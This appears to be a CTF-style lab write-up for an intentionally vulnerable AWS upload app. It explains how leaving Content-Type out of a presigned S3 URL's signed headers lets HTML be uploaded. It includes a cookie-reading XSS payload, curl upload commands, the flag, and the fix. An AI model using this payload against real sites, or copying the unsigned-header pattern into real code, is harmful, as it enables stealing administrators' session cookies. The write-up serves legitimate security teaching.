# Scenario 2 - Uploading Arbitrary HTML Files Using Signed URLs

[Japanese](./README.md) / [Top](../../README.en.md)

## Launch

```sh
cdk deploy Scenario2
# Or
docker compose run --rm cdk bash -c "cdk deploy Scenario2"
```

## Overview

This scenario involves an application that simulates uploading arbitrary HTML files using signed URLs, with the administrator being the target of the challenge. The ultimate goal of the challenge is to retrieve the cookies of the administrator handling customer inquiries.

**Similar Scenarios**

- [Scenario 1 - Uploading Arbitrary HTML Files Using SDK](../scenario1/README.en.md)
- [Scenario 3 - Uploading Arbitrary HTML Files Using POST Policy](../scenario3/README.en.md)

The administrator's actions are simulated by "Administrator Operation Mock," as in Scenario 1. The administrator views the application URL provided by the user and saves the results in the `/delivery` directory in S3.

![Architecture of Scenario2](design.png)

## Solution

This section describes the solution to the scenario.

### Application Behavior

The target application operates as follows:

1. The user sends a request to upload a file to the application's endpoint.
2. The application processes the request and generates a signed URL for uploading the file to S3.
   - During this process, the application generates a UUIDv4 and uses it as the filename for the signed URL.
3. The user uploads the file to S3 using the signed URL.
4. S3 receives and stores the file.
5. The application returns the filename to the user.
6. The user can access the file using the filename.

### Reviewing the Source Code

The implementation is similar to Scenario 1 but uses the `getSignedUrl` function to generate signed URLs.

The `/api/upload` implementation is in `cdk/lib/scenario2/application/src/app.ts`:

```typescript
server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  const allow = ['image/png', 'image/jpeg', 'image/gif'];
  if (!allow.includes(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: request.body.contentType,
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
```

The implementation shows that the API receives `contentType` and `length` parameters, which are used to generate a signed URL for uploading to S3. However, there is a problem: the `Content-Type` header is not included in `signableHeaders` when using the `getSignedUrl` function. This allows the `Content-Type` to be altered during the upload process.

[Reference](https://github.com/aws/aws-sdk-js-v3/blob/9b3fa28ae6bc7bf69f30a0f9e89eac4e058e4793/packages/polly-request-presigner/src/getSignedUrls.ts#L34-L42)

### Exploitation Strategy

The key point in this challenge is that the `Content-Type` is not included in `signableHeaders`. This omission allows the `Content-Type` to be modified to `text/html`, enabling arbitrary HTML file uploads.

The overall flow is similar to Scenario 1.

Save the following HTML file as `xss.html`:

```html
<!-- xss.html -->
<html>
  <body>
    <script>
      document.getElementsByTagName('body')[0].innerHTML = `${document.cookie.split('=')[1]}`;
    </script>
  </body>
</html>
```

Execute the following commands to upload the file:

```sh
TARGET_HOST="....."
FILE=xss.html
LENGTH=$(stat -c %s $FILE)
URL=$(curl -X POST https://${TARGET_HOST}/api/upload   -H "Content-Type: application/json"   -d '{"contentType":"image/png","length":'$LENGTH'}') | jq -r '.url'
curl -X PUT $URL --upload-file $FILE -H "Content-Type: text/html"
```

Provide the generated URL to the administrator through the Report URL field. This allows execution of arbitrary JavaScript in the administrator's browser. After execution, view the file saved in `/delivery/{uuid}` in S3 to retrieve the administrator's cookies.

## Challenge Response

```
flag{fc6f76dd4368e888c1bc878b7750b374c891639f}
```

## Fixing the Uploader

Finally, here is how to fix the uploader.

The `/api/upload` implementation is in `cdk/lib/scenario2/application/src/app.ts`. To address the issue, include `Content-Type` in `signableHeaders` when using `getSignedUrl`.

**Fix: Include Content-Type in signableHeaders**

```typescript
const url = await getSignedUrl(s3, command, {
  expiresIn: 60 * 60 * 24,
  signableHeaders: ['Content-Type'],
});
```

With this fix, `Content-Type` is included in `signableHeaders`, preventing it from being altered during the upload process.
